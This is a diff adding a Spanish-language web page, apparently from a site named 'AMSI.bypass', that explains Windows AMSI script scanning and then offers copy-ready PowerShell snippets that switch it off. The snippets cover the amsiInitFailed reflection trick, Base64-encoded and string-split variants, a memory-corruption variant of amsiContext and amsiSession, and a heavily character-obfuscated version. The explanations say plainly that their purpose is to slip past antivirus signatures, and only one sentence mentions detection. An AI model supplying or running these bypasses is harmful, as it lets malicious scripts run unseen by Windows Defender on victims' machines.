@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AMSI Info Module</title>
+    <link rel="icon" type="image/x-icon" href="img/icons/PS1.ico"> <!-- Icono de la pestaña -->
+    <link rel="stylesheet" href="css/style.css">
+    <script defer src="js/script.js"></script> <!-- Cargar Script funcional de la pagina -->
+</head>
+
+<body>
+
+    <!-- Header de la pagina -->
+    <header class="header">
+        <div class="logo-container">
+            <span class="logo-text">AMSI.bypass</span>
+        </div>
+
+        <!-- Botón de hamburguesa -->
+        <div class="burger" id="burger">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+
+        <!-- Imagen de la pagina -->
+        <img src="img/logoAMSIBypass2-sinFondo.png" alt="Logo AMSI Bypass" class="logo-page">
+
+        <!-- Overlay para cerrar aside al hacer clic fuera -->
+        <div class="overlay" id="overlay"></div>
+
+        <!-- Aside para la navegación -->
+        <aside id="sidebar">
+            <button id="closeBtn">&times;</button> <!-- Botón de cierre (X) -->
+            <br><br><br><br><br>
+            <div class="logo">AMSI.bypass</div>
+            <ul class="nav-links">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="amsiinfomodule.html">Info AMSI Module</a></li>
+                <li><a href="#">GitBook</a></li>
+                <!--<li><a href="https://github.com/Flangvik/AMSI.fail">GitHub</a></li>-->
+            </ul>
+        </aside>
+    </header> 
+
+    <!-- Overlay para cerrar aside al hacer clic fuera -->
+    <div class="overlay" id="overlay"></div>
+    
+    <!-- Texto de la pagina explicativo -->
+    <br><br><br><br><br><br><br>
+    <!-- Diseño de prompt kali terminal titulo -->
+    <div class="terminal-container-page2">
+        <div class="terminal-page-title">
+            <span class="line1">┌──(<span class="user">root</span>💀<span class="host">amsi.bypass</span>)-[~]</span>
+            <span class="line2">└─# <span class="command-page">¿Que es AMSI?</span></span>
+        </div>
+    </div> 
+    <!--<h2 class="margin-page-title">What is AMSI?</h2>-->
+    <hr class="styled-divider">
+    <br>
+    <p class="margin-page margin-page-desc">Como explicó f-secure en una de sus excelentes publicaciones de blog: <a class="link-page" href="https://blog.f-secure.com/hunting-for-amsi-bypasses/" target="_blank" rel="noopener noreferrer">Leer más sobre AMSI Bypasses</a><br><br>
+
+        AMSI es una interfaz en la que las aplicaciones o servicios (incluidos los de terceros) pueden escanear el contenido de un script en busca de uso malicioso. Si el proveedor de servicios antimalware AMSI (Windows Defender de forma predeterminada) registra una firma en el script, se bloqueará.
+        Para poner esto en contexto, considere los siguientes pasos que sigue PowerShell para integrarse con AMSI:<br><br>
+
+        Cuando se crea un proceso de PowerShell, AMSI.DLL se carga desde el disco a su espacio de direcciones.<br>
+        Dentro de AMSI.DLL, hay una función conocida como AmsiScanBuffer(), esencialmente la función utilizada para escanear el contenido de un script.<br><br>
+        En el símbolo del sistema de PowerShell, cualquier contenido proporcionado se enviará primero a AmsiScanBuffer(), antes de que se lleve a cabo cualquier ejecución.<br><br>
+        Posteriormente, AmsiScanBuffer() verificaría con el antivirus registrado para determinar si se ha creado alguna firma.<br><br>
+        Si el contenido se considera malicioso, será bloqueado.<br><br>
+        Dado que AMSI depende de ser cargado dentro del proceso que ejecuta el script real, las técnicas para romper o parchar funciones específicas dentro de amsi.dll son bien conocidas.</p>
+    <br>
+    <!-- Diseño de prompt kali terminal titulo -->
+    <div class="terminal-container-page2">
+        <div class="terminal-page-title">
+            <span class="line1">┌──(<span class="user">root</span>💀<span class="host">amsi.bypass</span>)-[~]</span>
+            <span class="line2">└─# <span class="command-page">Detección</span></span>
+        </div>
+    </div> 
+    <!--<h2 class="margin-page-title">Detection</h2>-->
+    <hr class="styled-divider">
+    <br>
+    <p class="margin-page margin-page-desc">Todas las técnicas demostradas se basan en la manipulación de la biblioteca amsi.dll dentro del proceso operativo; la detección de manipulación genérica es clave.</p>
+    <br>
+    <hr class="styled-divider">  <!-- Línea de separación -->
+    <h1 class="margin-page margin-page-desc">Codificación Base64</h1>
+    <p class="margin-page margin-page-desc">La AMSI es una interfaz diseñada por Microsoft para detectar y bloquear la ejecución de scripts maliciosos en tiempo real. Sin embargo, su mecanismo de detección se basa en firmas específicas, lo que permite que técnicas de ofuscación, como la codificación en Base64, puedan eludir estas defensas.<br>
+        <br>
+        Fabian Mosch demostró que al codificar en Base64 ciertas cadenas que activan la AMSI, como 'AmsiUtils' y 'amsiInitFailed', y decodificarlas en tiempo de ejecución, es posible evadir la detección. Esta técnica se basa en establecer el indicador 'amsiInitFailed' en 'true', lo que desactiva la capacidad de escaneo de la AMSI para el proceso actual.</p>
+    <br>
+    <h3 class="margin-page margin-page-desc">Implementación Original del Bypass de AMSI:</h3>
+
+    <!-- Mini terminal Bypass de AMSI-->
+    <div class="main-container-mini-terminal margin-page-desc-term">
+        <div class="mini-terminal">
+            <div class="terminal-header">
+                <span class="buttons">
+                    <span class="red"></span>
+                    <span class="yellow"></span>
+                    <span class="green"></span>
+                </span>
+                <span class="title">Bypass de AMSI</span>
+                <span class="copy-container">
+                    <span class="copied-text" id="copiedText">Copied!</span>
+                    <img src="img/copy.png" id="copyBtn" class="copy-btn" onclick="copyToClipboard()">
+                </span>
+            </div>
+            <pre class="terminal-body" id="commandOutput">
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+            </pre>
+        </div>
+    </div>
+
+    <h3 class="margin-page margin-page-desc">Implementación con Codificación Base64:</h3>
+
+    <!-- Mini terminal Bypass de AMSI Codificación Base64-->
+    <div class="main-container-mini-terminal margin-page-desc-term">
+        <div class="mini-terminal">
+            <div class="terminal-header">
+                <span class="buttons">
+                    <span class="red"></span>
+                    <span class="yellow"></span>
+                    <span class="green"></span>
+                </span>
+                <span class="title">Bypass de AMSI Codificación Base64</span>
+                <span class="copy-container">
+                    <span class="copied-text" id="copiedText">Copied!</span>
+                    <img src="img/copy.png" id="copyBtn" class="copy-btn" onclick="copyToClipboard()">
+                </span>
+            </div>
+            <pre class="terminal-body" id="commandOutput">
+$amsiUtils = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA'))
+$amsiInitFailed = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))
+[Ref].Assembly.GetType('System.Management.Automation.' + $amsiUtils).GetField($amsiInitFailed, 'NonPublic,Static').SetValue($null, $true)
+
+            </pre>
+        </div>
+    </div>
+
+    <h4 class="margin-page margin-page-desc">Explicación Detallada:</h4>
+    <p class="margin-page margin-page-desc">Codificación de Cadenas Sensibles: Las cadenas 'AmsiUtils' y 'amsiInitFailed' se codifican en Base64 para evitar la detección por firmas estáticas.<br>
+
+        Decodificación en Tiempo de Ejecución: Durante la ejecución del script, las cadenas codificadas se decodifican utilizando [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(...)).<br>
+        
+        Acceso y Modificación del Campo: Se accede al tipo 'System.Management.Automation.AmsiUtils' y se modifica el campo 'amsiInitFailed' a 'true', desactivando así la AMSI para el proceso actual.</p>
+
+    <h1 class="margin-page margin-page-desc">Forzar un Error</h1>
+    
+    <p class="margin-page margin-page-desc">Otra técnica para evadir la AMSI implica forzar una falla en su inicialización, lo que impide que la interfaz realice escaneos en el proceso actual. Originalmente, Matt Graeber descubrió que al establecer el campo 'amsiInitFailed' en 'true', se desactiva la AMSI. Sin embargo, debido a que esta técnica se basa en cadenas específicas, las soluciones antivirus han desarrollado firmas para detectarla.</p>
+    
+    <h3 class="margin-page margin-page-desc">Implementación Original del Bypass de AMSI:</h3>
+
+    <!-- Mini terminal Bypass de AMSI Force Error-->
+    <div class="main-container-mini-terminal margin-page-desc-term">
+        <div class="mini-terminal">
+            <div class="terminal-header">
+                <span class="buttons">
+                    <span class="red"></span>
+                    <span class="yellow"></span>
+                    <span class="green"></span>
+                </span>
+                <span class="title">Bypass de AMSI Force Error</span>
+                <span class="copy-container">
+                    <span class="copied-text" id="copiedText">Copied!</span>
+                    <img src="img/copy.png" id="copyBtn" class="copy-btn" onclick="copyToClipboard()">
+                </span>
+            </div>
+            <pre class="terminal-body" id="commandOutput">
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+            </pre>
+        </div>
+    </div>
+
+    <h3 class="margin-page margin-page-desc">Implementación Ofuscada:</h3>
+
+    <!-- Mini terminal Bypass de AMSI Force Error Ofuscada-->
+    <div class="main-container-mini-terminal margin-page-desc-term">
+        <div class="mini-terminal">
+            <div class="terminal-header">
+                <span class="buttons">
+                    <span class="red"></span>
+                    <span class="yellow"></span>
+                    <span class="green"></span>
+                </span>
+                <span class="title">Bypass de AMSI Force Error Ofuscada</span>
+                <span class="copy-container">
+                    <span class="copied-text" id="copiedText">Copied!</span>
+                    <img src="img/copy.png" id="copyBtn" class="copy-btn" onclick="copyToClipboard()">
+                </span>
+            </div>
+            <pre class="terminal-body" id="commandOutput">
+$w = 'System.Management.Automation.A'; $c = 'si'; $m = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w, $c, $m))
+$field = $assembly.GetField(('am{0}InitFailed' -f $c), 'NonPublic,Static')
+$field.SetValue($null, $true)
+            </pre>
+        </div>
+    </div>
+    
+    <h4 class="margin-page margin-page-desc">Explicación Detallada:</h4>
+
+    <p class="margin-page margin-page-desc">Ofuscación de Cadenas: Las cadenas 'AmsiUtils' y 'amsiInitFailed' se dividen y concatenan dinámicamente para evitar la detección por firmas estáticas.<br>
+
+        Acceso y Modificación del Campo: Se accede al tipo 'System.Management.Automation.AmsiUtils' y se modifica el campo 'amsiInitFailed' a 'true', desactivando la AMSI para el proceso actual.<br>
+        
+        Adam Chester propuso una variante que intenta forzar un error de manera legítima, sin utilizar directamente las cadenas detectables. Esta técnica asigna una región de memoria para 'amsiContext' y establece 'amsiSession' en null, lo que provoca un error y desactiva la AMSI.</p>
+
+    <h3 class="margin-page margin-page-desc">Implementación de Adam Chester:</h3>
+
+    <!-- Mini terminal Bypass AMSI Adam Chester-->
+    <div class="main-container-mini-terminal margin-page-desc-term">
+        <div class="mini-terminal">
+            <div class="terminal-header">
+                <span class="buttons">
+                    <span class="red"></span>
+                    <span class="yellow"></span>
+                    <span class="green"></span>
+                </span>
+                <span class="title">Bypass AMSI Adam Chester</span>
+                <span class="copy-container">
+                    <span class="copied-text" id="copiedText">Copied!</span>
+                    <img src="img/copy.png" id="copyBtn" class="copy-btn" onclick="copyToClipboard()">
+                </span>
+            </div>
+            <pre class="terminal-body" id="commandOutput">
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$mem)
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession", "NonPublic,Static").SetValue($null, $null)
+            </pre>
+        </div>
+    </div>
+
+    <h3 class="margin-page margin-page-desc">Implementación Ofuscada:</h3>
+
+    <!-- Mini terminal Bypass AMSI Melvin Langvik-->
+    <div class="main-container-mini-terminal margin-page-desc-term">
+        <div class="mini-terminal">
+            <div class="terminal-header">
+                <span class="buttons">
+                    <span class="red"></span>
+                    <span class="yellow"></span>
+                    <span class="green"></span>
+                </span>
+                <span class="title">Bypass AMSI Melvin Langvik</span>
+                <span class="copy-container">
+                    <span class="copied-text" id="copiedText">Copied!</span>
+                    <img src="img/copy.png" id="copyBtn" class="copy-btn" onclick="copyToClipboard()">
+                </span>
+            </div>
+            <pre class="terminal-body" id="commandOutput">
+$fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
+            </pre>
+        </div>
+    </div>
+
+    <h3 class="margin-page margin-page-desc">Resumen de la técnica "Forzar un Error":</h3>
+
+    <p class="margin-page margin-page-desc">Manipulación de memoria: Se reserva un bloque de memoria con AllocHGlobal y se asigna a amsiContext, lo que altera su funcionamiento.<br>
+        Anulación de sesión AMSI: Se fuerza la variable amsiSession a null, interrumpiendo el flujo normal de AMSI.<br>
+        Evitar detección por firmas: Mediante la ofuscación de cadenas (char manipulado y Normalize()), se esquivan las reglas de detección de antivirus modernos.</p>
+
+    <br><br><br><br><br><br>
+
+    <!-- Footer de la pagina -->
+     
+    <footer class="footer">
+        <div class="footer-content">
+            <span class="footer-text">© 2025 BYPASS AMSI | AMSI.bypass</span>
+        </div>
+    </footer> 
+</body>
+
+</html>
